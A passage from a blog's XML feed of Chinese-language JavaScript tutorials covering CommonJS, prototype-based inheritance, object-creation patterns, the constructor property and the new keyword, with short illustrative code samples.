    <title>什么是CommonJS？</title>
    <url>/blog/plang/javascript/commonjsjj/</url>
    <content><![CDATA[<p>今天看到一个关于commonJs和nodeJs的简介~</p>
<p>早就听说有用于本地编程的JavaScript框架，但总觉得是小打小闹不成气候，也没有什么实用价值。但自从CommonJS和NodeJS两个项目的出现，JavaScript作为本地编程语言的这种特殊应用形式，才开始进入进入大众的视野。</p>
<p>本文翻译CommonJS首页的介绍，说明什么是CommonJS。</p>
<p>另外随着并行计算的普及，像JavaScript这种函数式语言，由于其固有的易于进行并行计算的特性，将有更广阔的应用前景。</p>
<p>JavaScript是一个强大面向对象语言，它有很多快速高效的解释器。官方JavaScript标准定义的API是为了构建基于浏览器的应用程序。然而，并没有定于一个用于更广泛的应用程序的标准库。</p>
<p>CommonJS API定义很多普通应用程序（主要指非浏览器的应用）使用的API，从而填补了这个空白。它的终极目标是提供一个类似Python，Ruby和Java标准库。这样的话，开发者可以使用CommonJS API编写应用程序，然后这些应用可以运行在不同的JavaScript解释器和不同的主机环境中。在兼容CommonJS的系统中，你可以实用JavaScript程序开发：</p>
<ul>
<li>服务器端JavaScript应用程序</li>
<li>命令行工具</li>
<li>图形界面应用程序</li>
<li>混合应用程序（如，Titanium或Adobe AIR）</li>
</ul>
<p><strong>NodeJS和CommonJS之间的关系</strong></p>
<p>CommonJS是一种规范，NodeJS是这种规范的实现。CommonJS是一个不断发展的规范，计划将要包括如下部分：</p>
<p>具体每个子规范的定制进度请查看官方网站的说明：<a href="http://commonjs.org/specs/">http://commonjs.org/specs/</a></p>
<p>CommonJS有很多实现，其中不乏很多大名鼎鼎的项目，比如说：Apache的<a href="http://couchdb.apache.org/">CouchDB</a>和<a href="http://nodejs.org/">node.js</a>等。但这些项目大部分只实现了CommonJS的部分规范。具体的项目和实现部分参见官方网站的说明：<a href="http://commonjs.org/impl/">http://commonjs.org/impl/</a></p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>javascript面向对象设计-继承</title>
    <url>/blog/plang/javascript/extends/</url>
    <content><![CDATA[<h2 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h2><p>原型链很强大，可以用它来实现继承，可是又存在一些问题，其中最主要的来自包含引用类型的原型。</p>
<p>包含引用类型值的属性会被所有实例共享；而这也正是为什么要在构造函数中，而不是原型对象中定义属性的原因。</p>
<p>通过原型来实现继承时，原型实际上会变成另一个类型的实例。于是，原先的实例属性也就顺理成章地变成了现在的原型属性了。来看下面的代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function ChaoLei()&#123;</span><br><span class="line">    this.colors = [&quot;red&quot;,&quot;black&quot;,&quot;green&quot;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function ZiLei()&#123;</span><br><span class="line">&#125;</span><br><span class="line">//继承ChaoLei</span><br><span class="line">ZiLei.prototype = new ChaoLei();</span><br><span class="line">var instance1 =new ZiLei();</span><br><span class="line">instance1.colors.push(&quot;yellow&quot;);//red black green yellow</span><br><span class="line">alert(instance1.colors);</span><br><span class="line"></span><br><span class="line">var instance2 = new ZiLei();</span><br><span class="line">alert(instance2.colors);//red black green yellow</span><br></pre></td></tr></table></figure>

<p>这段代码ChaoLei构造函数（之前提过，构造函数用大写字母开头）定义了一个colors属性，该属性包含一个数组（引用类型的值）。ChaoLei的每个实例都会各自包含自己数组的colors属性。</p>
<p>当ZiLei通过原型继承了ChaoLei之后，Zilei.prototye就成为了ChaoLei的一个实例，因此他有了自己的colors属性。</p>
<p>结果是：ZiLei的所有实例都共享colors属性（例如：instance1和instance2），所以：对instance1进行修改，从instance2也可以反映出来。</p>
<p>那么如何解决这个问题呢？那就只能用下面这种办法：借用构造函数。</p>
<h2 id="借用构造函数"><a href="#借用构造函数" class="headerlink" title="借用构造函数"></a>借用构造函数</h2><p>在子类型构造函数的内部调用超类型构造函数。</p>
<p>这句话不好理解，换句话说要做到这句话的方法是：通过使用call()和apply()方法，在（将来）新创建的对象上执行构造函数，具体做法如下面这个例子：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function ChaoLei()&#123;</span><br><span class="line">    this.colors = [&quot;red&quot;,&quot;black&quot;,&quot;green&quot;];</span><br><span class="line">&#125;</span><br><span class="line">function ZiLei()&#123;</span><br><span class="line">    //继承ChaoLei</span><br><span class="line">    ChaoLei.call(this);   </span><br><span class="line">&#125;</span><br><span class="line">var instance1 = new ZiLei();</span><br><span class="line">instance1.colors.push(&quot;yellow&quot;);</span><br><span class="line">alert(instance1.colors);</span><br><span class="line">var instance2 = new ZiLei();</span><br><span class="line">alert(instance2.colors);</span><br></pre></td></tr></table></figure>

<p>问题：</p>
<p>会将所有父中的对象都添加到子对象中，方法不可复用。</p>
<h2 id="组合继承"><a href="#组合继承" class="headerlink" title="组合继承"></a>组合继承</h2><p>用原型链实现对原型属性和方法的继承，通过借用构造函数来实现对实例属性的继承。来看例子：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function ChaoLei(name)&#123;</span><br><span class="line">    this.name = name;</span><br><span class="line">    this.colors = [&quot;red&quot;,&quot;blue&quot;,&quot;black&quot;];           </span><br><span class="line">&#125;</span><br><span class="line">ChaoLei.prototype.sayName = function()&#123;</span><br><span class="line">    alert(this.name);</span><br><span class="line">&#125;;</span><br><span class="line">function ZiLei(name,age)&#123;</span><br><span class="line">    //继承属性</span><br><span class="line">    ChaoLei.call(this,name);</span><br><span class="line">    this.age = age;</span><br><span class="line">&#125;</span><br><span class="line">//继承方法</span><br><span class="line">ZiLei.prototype = new ChaoLei(); </span><br><span class="line">ZiLei.prototype.sayAge = function()&#123;</span><br><span class="line">    alert(this.age);</span><br><span class="line">&#125;;</span><br><span class="line">var instance1 = new ZiLei(&quot;Tony&quot;,22);</span><br><span class="line">instance1.colors.push(&quot;green&quot;);</span><br><span class="line">alert(instance1.colors); // &quot;red&quot;,&quot;blue&quot;,&quot;black&quot;,&quot;green&quot;</span><br><span class="line">instance1.sayName();//Tony</span><br><span class="line">instance1.sayAge();//22</span><br><span class="line"></span><br><span class="line">var instance2 = new ZiLei(&quot;Tom&quot;,30);</span><br><span class="line">alert(instance2.colors);// &quot;red&quot;,&quot;blue&quot;,&quot;black&quot;</span><br><span class="line">instance2.sayName();//Tom</span><br><span class="line">instance2.sayAge();//30</span><br></pre></td></tr></table></figure>

<p>这个例子有点长，我们一步一步看：</p>
<ol>
<li>ChaoLei构造函数中定义了两个属性：name和colors</li>
<li>ChaoLei的原型中定义了一个方法：sayName（）</li>
<li>ZiLei构造函数中调用ChaoLei构造函数，同时传入了name参数，同时自己定义了一个age属性</li>
<li>ZiLei的原型继承ChaoLei的实例，然后又在该新原型上定义了新方法sayAge()</li>
<li>这个ZiLei的两个不同实例(instance1和instance2)都用他们自己的属性，也可以使用相同的方法了。</li>
</ol>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>javascript深入Function和类型</title>
    <url>/blog/plang/javascript/function/</url>
    <content><![CDATA[<h2 id="类型的类型"><a href="#类型的类型" class="headerlink" title="类型的类型"></a>类型的类型</h2><p><strong>类型是Function的实例。</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alert( String instanceof Function);//true</span><br><span class="line">alert( Number instanceof Function);//true</span><br><span class="line">alert( Boolean instanceof Function);//true</span><br><span class="line">alert( Object instanceof Function);//true</span><br><span class="line">alert( Function instanceof Function);//true</span><br><span class="line"></span><br><span class="line">alert(typeof String);//function</span><br><span class="line">alert(typeof  Number);//function</span><br><span class="line">alert(typeof  Boolean);//function</span><br><span class="line">alert(typeof  Object);//function</span><br><span class="line">alert(typeof  Function);//function</span><br></pre></td></tr></table></figure>

<h2 id="类型的内容"><a href="#类型的内容" class="headerlink" title="类型的内容"></a>类型的内容</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alert( String);//function String() &#123;[native code]&#125;</span><br><span class="line">alert( Number);//function Number() &#123;[native code]&#125;</span><br><span class="line">alert( Boolean);//function Boolean() &#123;[native code]&#125;</span><br><span class="line">alert( Object);//function Object() &#123;[native code]&#125;</span><br><span class="line">alert( Function);//function Function() &#123;[native code]&#125;</span><br></pre></td></tr></table></figure>

<h2 id="类型的-proto-属性"><a href="#类型的-proto-属性" class="headerlink" title="类型的__proto__属性"></a>类型的__proto__属性</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alert( String.__proto__);//function()&#123;&#125;</span><br><span class="line">alert( Number.__proto__);//function()&#123;&#125;</span><br><span class="line">alert( Boolean.__proto__);//function()&#123;&#125;</span><br><span class="line">alert( Object.__proto__);//function()&#123;&#125;</span><br><span class="line">alert( Function.__proto__);//function()&#123;&#125;</span><br><span class="line">alert( String.__proto__===Function.prototype);//true</span><br><span class="line">alert( Number.__proto__===Function.prototype);//true</span><br><span class="line">alert( Boolean.__proto__===Function.prototype);//true</span><br><span class="line">alert( Object.__proto__===Function.prototype);//true</span><br><span class="line">alert( Function.__proto__===Function.prototype);//true</span><br></pre></td></tr></table></figure>

<p>类型都是由一个构造函数创建的，这个构造函数的prototype为function(){}。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alert( Function.prototype);//function()&#123;&#125;</span><br></pre></td></tr></table></figure>

<p>再次说明类型是Function的实例。</p>
<h2 id="类型的prototype"><a href="#类型的prototype" class="headerlink" title="类型的prototype"></a>类型的prototype</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alert( String.prototype);//&#x27;&#x27;</span><br><span class="line">alert( Number.prototype);//0</span><br><span class="line">alert( Boolean.prototype);//false</span><br><span class="line">alert( Object.prototype);//[object Object]</span><br><span class="line">alert( Function.prototype);//function()&#123;&#125;</span><br></pre></td></tr></table></figure>

<p>类型的prototype决定了其创建对象的__proto__属性，可以看new关键字的作用。</p>
<p>类型的区别从这里开始。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alert(typeof  String.prototype);//object</span><br><span class="line">alert(typeof  Number.prototype);//object</span><br><span class="line">alert(typeof  Boolean.prototype);//object</span><br><span class="line">alert(typeof  Object.prototype);//object</span><br><span class="line">alert(typeof  Function.prototype);//function</span><br></pre></td></tr></table></figure>

<h2 id="类型的constructor"><a href="#类型的constructor" class="headerlink" title="类型的constructor"></a>类型的constructor</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alert(String.hasOwnProperty(&#x27;constructor&#x27;));//false</span><br><span class="line">alert(String.__proto__.hasOwnProperty(&#x27;constructor&#x27;));//true</span><br><span class="line"></span><br><span class="line">alert(String.constructor);//function Function() &#123;[native code]&#125;</span><br><span class="line">alert(Number.constructor);//function Function() &#123;[native code]&#125;</span><br><span class="line">alert(Boolean.constructor);//function Function() &#123;[native code]&#125;</span><br><span class="line">alert(Object.constructor);//function Function() &#123;[native code]&#125;</span><br><span class="line">alert(Function.constructor);//function Function() &#123;[native code]&#125;</span><br></pre></td></tr></table></figure>

<p>类型都是用function Function() {[native code]}创建的。function</p>
<p>Function() {[native code]}是什么呢？</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alert(Function); //function Function() &#123;[native code]&#125;</span><br><span class="line">alert(String.constructor===Function);//true</span><br><span class="line">alert(Number.constructor===Function);//true</span><br><span class="line">alert(Boolean.constructor===Function);//true</span><br><span class="line">alert(Object.constructor===Function);//true</span><br><span class="line">alert(Function.constructor===Function);//true</span><br></pre></td></tr></table></figure>

<p>再次说明了类型是Function的实例。</p>
<h2 id="Function"><a href="#Function" class="headerlink" title="Function"></a>Function</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//一个环结构</span><br><span class="line">alert(Function.prototype);//function()&#123;&#125;</span><br><span class="line">alert(Function.__proto__===Function.prototype)//true</span><br><span class="line">alert(Function.prototype.constructor===Function)//true</span><br><span class="line">//一个奇怪的对象，是函数类型，但不是由Function创建。</span><br><span class="line">alert(Function.prototype instanceof Object);//true</span><br><span class="line">alert(Function.prototype instanceof Function);//false</span><br><span class="line">alert(typeof Function.prototype);//function</span><br><span class="line">// Function也是对象</span><br><span class="line">alert(Function.prototype.__proto__)//[object Object]</span><br><span class="line">alert(Function.prototype.__proto__===Object.prototype)//true</span><br><span class="line">alert(Function.prototype.__proto__===Number.prototype)//false</span><br><span class="line">alert(Function.prototype.__proto__.__proto__);//null</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>有一个神秘对象function(){}，它没有prototype属性，所以不能创建对象；它是function类型但不是Function实例，它的__proto__为object对象和Object.prototype是一个对象。</p>
<p>Function的__proto__为function(){}，function(){}的constructor为Function，这是函数对象的顶层结构，因为函数对象也是由函数对象创建的，上层一定是一个环。</p>
<p>所有类型的__proto__为function(){}，而function(){}的constructor为Function，说明类型是由Function创建的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alert(String.prototype);//空</span><br><span class="line">alert(String.prototype===Object.prototype);//false</span><br></pre></td></tr></table></figure>

<p><img src="/images/js/js-class.png"></p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>javascript创建对象详解</title>
    <url>/blog/plang/javascript/createobject/</url>
    <content><![CDATA[<h2 id="传统的方法"><a href="#传统的方法" class="headerlink" title="传统的方法"></a>传统的方法</h2><p>创建对象最简单的方法，就是创建一个Object对象，然后为它添加属性和方法。</p>
<p>如果一个对象成员引用了一个函数，该成员就被称为一个”方法”，如果一个对象成员引用了一个非函数，该成员就被称为”属性”。</p>
<p>看下面这个例子：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var person = new Object();</span><br><span class="line">person.name = &quot;Tony&quot;;  </span><br><span class="line">//创建了书一个方法（因为引用了函数）</span><br><span class="line">person.sayName = function()&#123;   </span><br><span class="line">  //this前面讲过，指的是当前函数的对象，在这里指的就是person对象</span><br><span class="line">    alert(this.name);          </span><br><span class="line">&#125;;</span><br><span class="line">person.sayName();  //输出结果显而易见 Tony</span><br></pre></td></tr></table></figure>

<p>缺点：使用同一个接口创建很多相似对象，会产生大量的重复代码。（为了解决这个问题—工厂模式出现了）</p>
<h2 id="工厂模式"><a href="#工厂模式" class="headerlink" title="工厂模式"></a>工厂模式</h2><p>用函数来封装用特定接口创建对象的细节</p>
<p>比如下面这个例子：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function createPerson(name,age,job)&#123; </span><br><span class="line">    var o = new Object();              </span><br><span class="line">    o.name = name;</span><br><span class="line">    o.age = age;</span><br><span class="line">    o.job = job;</span><br><span class="line">    o.sayName = function()&#123;</span><br><span class="line">        alert(this.name);</span><br><span class="line">    &#125;;</span><br><span class="line">    return o;</span><br><span class="line">&#125;</span><br><span class="line">var person1 = createPerson(&quot;Tony&quot;,23,&quot;worker&quot;);</span><br><span class="line">var person2 = createPerson(&quot;Tom&quot;,18,&quot;student&quot;);</span><br><span class="line">person1.sayName();  //Tony</span><br><span class="line">person2.sayName();  //Tom</span><br></pre></td></tr></table></figure>

<p>函数createPerson()能够根据接受的三个参数来创建一个包含</p>
<p>所有信息的Person对象。</p>
<p>优点：解决了传统方法里创建多个相似对象的问题。</p>
<p>缺点：没有解决对象识别的问题。（可以靠构造函数模式来解决）</p>
<h2 id="构造函数模式"><a href="#构造函数模式" class="headerlink" title="构造函数模式"></a>构造函数模式</h2><p>可以创造特定类型的对象</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function Person(name,age,job)&#123;</span><br><span class="line">    this.name = name;</span><br><span class="line">    this.age = age;</span><br><span class="line">    this.job = job;</span><br><span class="line">    this.sayName = function()&#123;</span><br><span class="line">        alert(this.name);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line">var person1 =new Person(&quot;Tony&quot;,23,&quot;worker&quot;);</span><br><span class="line">var person2 =new Person(&quot;Tom&quot;,18,&quot;student&quot;);</span><br><span class="line">person1.sayName();  //Tony</span><br><span class="line">person2.sayName();  //Tom</span><br></pre></td></tr></table></figure>

<p>与工厂模式的不同之处：</p>
<ol>
<li>没有显示地创建构造函数</li>
<li>直接将属性和方法赋给了this对象</li>
<li>没有return语句</li>
</ol>
<p>优点：动态的传递参数</p>
<p>缺点：每创建一个对象就会创建相同的方法函数对象，占用大量内存。（可以用原型模式来解决）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alert(person1.sayName == person2.sayName) //false</span><br></pre></td></tr></table></figure>

<p>由上代码可以看出来，这两个Function实例并不相等，然而创建两个完成同样任务的Function实例没有必要。</p>
<h2 id="原型模式"><a href="#原型模式" class="headerlink" title="原型模式"></a>原型模式</h2><p>将对象属性及方法定义都写在对象的prototype里面</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function Person()&#123;</span><br><span class="line">&#125; </span><br><span class="line">Person.prototype.name = &quot;Tony&quot;;</span><br><span class="line">Person.prototype.age = 22;</span><br><span class="line">Person.prototype.job = &quot;worker&quot;;</span><br><span class="line">Person.prototype.sayName = function()&#123;</span><br><span class="line">    alert(this.name);</span><br><span class="line">&#125;;</span><br><span class="line">var person1 = new Person();</span><br><span class="line">person1.sayName();//Tony</span><br><span class="line">var person2 = new Person();</span><br><span class="line">//这里就是原型模式的缺点：无法动态传递构造参数</span><br><span class="line">person2.sayName();//Tony</span><br><span class="line">//正好与上文中的构造函数相反，这里是相同的Function对象</span><br><span class="line">alert(person1.sayName == person2.sayName); //true</span><br></pre></td></tr></table></figure>

<p>优点：每次创建对象时都是使用相同prototype中的方法，不会占用重复的内存<br>缺点：无法动态传递构造参数（构造函数模式可以解决）</p>
<h2 id="组合构造函数模式和原型模式"><a href="#组合构造函数模式和原型模式" class="headerlink" title="组合构造函数模式和原型模式"></a>组合构造函数模式和原型模式</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function Person(name,age,job)&#123;   //构造函数模式</span><br><span class="line">    this.name = name;</span><br><span class="line">    this.age = age;</span><br><span class="line">    this.job =job;</span><br><span class="line">    this.friends = [&quot;S&quot;,&quot;C&quot;];</span><br><span class="line">&#125;</span><br><span class="line">Person.prototype = &#123;    //原型模式</span><br><span class="line">    constructor : Person,</span><br><span class="line">    sayName:function()&#123;</span><br><span class="line">        alert(this.name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">var person1 = new Person(&quot;Tony&quot;,22,&quot;worker&quot;);</span><br><span class="line">var person2 = new Person(&quot;Tom&quot;,18,&quot;student&quot;);</span><br><span class="line">//person1里面添加了V,并不影响person2,因为他们引用的是不同数组</span><br><span class="line">person1.friends.push(&quot;V&quot;);   </span><br><span class="line"></span><br><span class="line">alert(person1.friends);     //s,c,v</span><br><span class="line">alert(person2.friends);     //s,c</span><br><span class="line">alert(person1.friends === person2.friends); //false</span><br><span class="line">alert(person1.sayName === person2.sayName); //true</span><br></pre></td></tr></table></figure>

<p>优点：综合了constructor及prototype方式的优点，可以动态传递构造参数，并且方法函数对象也只创建一个。<br>缺点：函数写在对象外面，不太符合面向对象的思想（可以用动态原型的方式来解决）</p>
<h2 id="动态原型模式"><a href="#动态原型模式" class="headerlink" title="动态原型模式"></a>动态原型模式</h2><p>加一个判断属性，来判断该对象是否已经被创建过，如果被创建过，则方法就不在构建</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function Person(name,age,job)&#123;</span><br><span class="line">    //属性</span><br><span class="line">    this.name = name;</span><br><span class="line">    this.age = age;</span><br><span class="line">    this.job = job;</span><br><span class="line">    //方法</span><br><span class="line">    //只有在sayName方法不存时，才会添加到原型中</span><br><span class="line">    if(typeof this.sayName !=&quot;function&quot;)&#123;      </span><br><span class="line">        Person.prototype.sayName = function()&#123;</span><br><span class="line">            alert(this.name);</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">var person = new Person(&quot;Tony&quot;,22,&quot;worker&quot;);</span><br><span class="line">person.sayName();</span><br></pre></td></tr></table></figure>

<p>优点：将原型函数写在对象定义里面</p>
<p>缺点：不支持继承</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>javascript面向对象设计-深入constructor属性</title>
    <url>/blog/plang/javascript/constructor/</url>
    <content><![CDATA[<h2 id="constructor属性"><a href="#constructor属性" class="headerlink" title="constructor属性"></a>constructor属性</h2><p>一个对象如何知道是哪个函数构造的它呢？通过constructor属性可以知道。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 等价于 var foo = new Array(1, 56, 34, 12);  </span><br><span class="line">var arr = [1, 56, 34, 12];  </span><br><span class="line">alert(arr.constructor === Array); // true </span><br><span class="line"></span><br><span class="line">// 等价于 var foo = new Function();  </span><br><span class="line">var Foo = function() &#123; &#125;;  </span><br><span class="line">alert (Foo.constructor === Function); // true  </span><br><span class="line"></span><br><span class="line">// 由构造函数实例化一个obj对象  </span><br><span class="line">var obj = new Foo();  </span><br><span class="line">alert (obj.constructor === Foo); // true   </span><br><span class="line">// 将上面两段代码合起来，就得到下面的结论  </span><br><span class="line">alert (obj.constructor.constructor === Function); // true</span><br></pre></td></tr></table></figure>

<h2 id="constructor属性的由来"><a href="#constructor属性的由来" class="headerlink" title="constructor属性的由来"></a>constructor属性的由来</h2><p>那constructor属性是怎么来的呢？要想弄清这个问题就要知道constructor属性的具体位置，是在对象里还是在原型里。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var p=new function()&#123;&#125;;</span><br><span class="line">alert(p.hasOwnProperty(&#x27;constructor&#x27;));//false</span><br><span class="line">alert(p.__proto__.hasOwnProperty(&#x27;constructor&#x27;));//true</span><br></pre></td></tr></table></figure>

<p>hasOwnProperty方法是来判定对象是否包含指定名称的属性，不会向原型链搜索。要想搜索原型链可以用in关键字（’constructor’ in obj）。</p>
<p>由上面代码可知constructor属性是对象原型中的属性。我们再来做一个测试就更清楚了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function Person(name) &#123;&#125;;  </span><br><span class="line">alert(Person.prototype.constructor===Person);//true</span><br></pre></td></tr></table></figure>

<p>函数对象的prototype最终会成为对象的原型，其constructor自然也就是对象原型的一部分，这样obj.constructor自然也是成立的。可以参见<a href="newkeyword.php" title="javascript中new关键字的作用">new关键字的作用</a>。</p>
<h2 id="不可靠的constructor"><a href="#不可靠的constructor" class="headerlink" title="不可靠的constructor"></a>不可靠的constructor</h2><p>为什么说constructor不可靠，因为prototype是可改变的，在用原型模拟继承时这是经常的事。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function ClassA()&#123;&#125;</span><br><span class="line">function ClassB()&#123;&#125;</span><br><span class="line">ClassB.prototype=new ClassA();</span><br><span class="line">var obj=new ClassB();</span><br><span class="line">alert(obj.constructor===ClassB);//false</span><br><span class="line">alert(obj.constructor===ClassA);//true</span><br><span class="line">alert(obj.__proto__ instanceof ClassA);//true</span><br><span class="line">alert(obj.__proto__.hasOwnProperty(&#x27;constructor&#x27;));//false</span><br><span class="line">alert(obj.__proto__.__proto__.hasOwnProperty(&#x27;constructor&#x27;));//true</span><br></pre></td></tr></table></figure>

<p>为什么obj的constructor跑到了原型的原型中？</p>
<p>obj的原型是new ClassA()，是没有constructor属性的，ClassA的prototype没有改变是有constructor属性的，所以new ClassA()的对象的原型是有constructor属性的，所以constructor属性就到了原型的原型中了。</p>
<p>所以要想用constructor属性来判定对象类型，就要手工设置其constructor属性。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function ClassA()&#123;&#125;</span><br><span class="line">function ClassB()&#123;&#125;</span><br><span class="line">ClassB.prototype=new ClassA();</span><br><span class="line">ClassB.prototype.constructor=ClassB;</span><br><span class="line">var obj=new ClassB();</span><br></pre></td></tr></table></figure>

<p>这样生成的对象就正常了。</p>
<h2 id="instanceof关键字也不可靠"><a href="#instanceof关键字也不可靠" class="headerlink" title="instanceof关键字也不可靠"></a>instanceof关键字也不可靠</h2><p>假设有一条这样的语句：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">obj instanceof ClassA;</span><br></pre></td></tr></table></figure>

<p>在上面的语句执行过程中，虚拟机会把ClassA.prototype和obj的_proto_链上的节点逐个进行比较，如果找到相等的节点，则返回true，否则返回false。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function ClassA()&#123;&#125;</span><br><span class="line">function ClassB()&#123;&#125;</span><br><span class="line">function ClassC()&#123;&#125;</span><br><span class="line">ClassB.prototype=new ClassA();</span><br><span class="line">var obj=new ClassB();</span><br><span class="line">alert(obj instanceof ClassB);//true</span><br><span class="line">alert(obj instanceof ClassA);//true</span><br><span class="line">ClassB.prototype=&#123;&#125;;</span><br><span class="line">alert(obj instanceof ClassB);//false</span><br></pre></td></tr></table></figure>

<p>由于ClassB改了prototype属性，所以instanceof也不好使了。</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>javascript中new关键字的作用</title>
    <url>/blog/plang/javascript/newkeyword/</url>
    <content><![CDATA[<p>创建具备特定类型的对象可以通过使用new关键字用构造函数模式来完成。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function ClassA()&#123;</span><br><span class="line"> this.name=&quot; ClassA &quot;;</span><br><span class="line">&#125;</span><br><span class="line">var p = new ClassA ();</span><br></pre></td></tr></table></figure>

<p>在这个过程中，相当于以ClassA()为“模版”创建了一个新对象p，它具备ClassA构造器中的成员变量和构造器原型。并且ClassA将this设置为p。</p>
<p>过程模拟:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var p = &#123;&#125;;</span><br><span class="line"> ClassA.apply(p);</span><br><span class="line"> p.__proto__= ClassA.prototype;</span><br></pre></td></tr></table></figure>

<p>在调用构造函数的过程中会经历以下4个步骤：</p>
<ol>
<li>创建一个新对象</li>
<li>将构造函数的作用域赋给新对象(因此this指向这个新对象)</li>
<li>执行构造函数中的代码(为这个新对象添加属性)</li>
<li>返回新对象</li>
</ol>
<p>接下来说说构造函数里包含return的情况</p>
<p>构造函数在没有指定返回值的情况下，默认会返回新对象实例。</p>
<p>如果指定的返回值是基本数据类型的话，仍然会返回新对象实例。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function A()&#123;</span><br><span class="line"> this.x=3;</span><br><span class="line"> return &quot;OK&quot;;</span><br><span class="line">&#125;</span><br><span class="line">var a = new A();</span><br><span class="line">alert(a instanceof A )// true;</span><br><span class="line">alert(&quot;x&quot; in a )// true</span><br></pre></td></tr></table></figure>

<p>如果指定返回对象了的话，被返回的对象就成了指定的对象值。</p>
<p>在这种情况下，this值所引用的对象就被丢弃了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function B()&#123;</span><br><span class="line">    this.x=3;</span><br><span class="line">    return Object(&quot;OK&quot;);</span><br><span class="line">&#125;</span><br><span class="line">var b = new B();</span><br><span class="line">alert(&quot;x&quot; in b )//false</span><br><span class="line">alert(b instanceof B )//false</span><br><span class="line">alert(b instanceof String )//true</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>javascript面向对象设计-对象和原型浅析</title>
    <url>/blog/plang/javascript/prototype/</url>
    <content><![CDATA[<h2 id="基本类型和对象"><a href="#基本类型和对象" class="headerlink" title="基本类型和对象"></a>基本类型和对象</h2><p>javascript中有三种基本数据类型，字符串(string)，数值(number)，布尔值(boolean),其余全是对象。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alert(typeof &#x27;asdf&#x27;);//string</span><br><span class="line">alert(typeof 22);//number</span><br><span class="line">alert(typeof true);//boolean</span><br><span class="line">alert(typeof new function()&#123;&#125;);//object</span><br></pre></td></tr></table></figure>

<p>基本数据类型在需要时会自动包装成对象类型，完成后再拆装为基本类型。</p>
<p>包装过程：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alert(typeof new String(&#x27;asdf&#x27;));//object</span><br><span class="line">alert(typeof new Number(22));//object</span><br><span class="line">alert(typeof new Boolean(true));//object</span><br></pre></td></tr></table></figure>

<p>将对象转换为基本类型则是通过这样的方式：通过调用对象的valueOf()方法来取得对象的值，如果和上下文的类型匹配，则使用该值。如果valueOf取不到值的话，则需要调用对象的toString()方法，而如果上下文为数值型，则又需要将此字符串转换为数值。</p>
<h2 id="对象的原型"><a href="#对象的原型" class="headerlink" title="对象的原型"></a>对象的原型</h2><p>每个对象都有一个__proto__属性，这个属性指向另一个对象。__proto__属性指向的对象为拥有__proto__属性对象的原型。由于原型也是对象，所以它也有原型，这样就成了一个链结构叫原型链。原型链最终一个原型的__proto__会指向null。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var obj=new function()&#123;&#125;;</span><br><span class="line">alert(obj.__proto__.__proto__.__proto__);//null</span><br><span class="line">alert(obj.__proto__);//[object Object]</span><br><span class="line">alert(obj.__proto__.__proto__);//[object Object]</span><br></pre></td></tr></table></figure>

<p>函数对象的__proto__属性</p>
